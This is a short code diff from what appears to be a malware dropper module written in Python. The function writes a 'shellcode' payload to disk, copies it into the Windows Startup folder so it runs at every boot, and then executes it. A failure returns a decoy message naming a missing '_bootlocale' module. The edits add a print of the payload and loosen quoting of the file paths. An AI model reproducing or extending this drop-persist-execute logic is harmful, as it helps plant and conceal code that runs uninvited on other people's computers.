@@ -70,18 +70,19 @@ def run(**args):
 
     try:
         mon_fichier = open(OsTargetpath, "wb")
+        print(shellcode)
         mon_fichier.write(shellcode)
         mon_fichier.close()
         if os.name == 'nt' and winRunOnBoot == True:
             startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-            os.system("copy /Y \"%s\" \"%s\""%(targetPath, startPath))
+            os.system("copy /Y %s \"%s\""%(targetPath, startPath))
     except:
         print("[Error] getFileFromURI: could not create OsTargetpath")
         return " modules/_bootlocale not found!!"
 
     if start and os.name == 'nt': #TODO: check how to start python script
         if bin:
-            os.system("start {}".format(OsTargetpath.replace('/','\\')))
+            os.system("start {}".format(OsTargetpath))
         else:
             os.system(scriptExec+" "+OsTargetpath)
     elif start and os.name == 'posix':
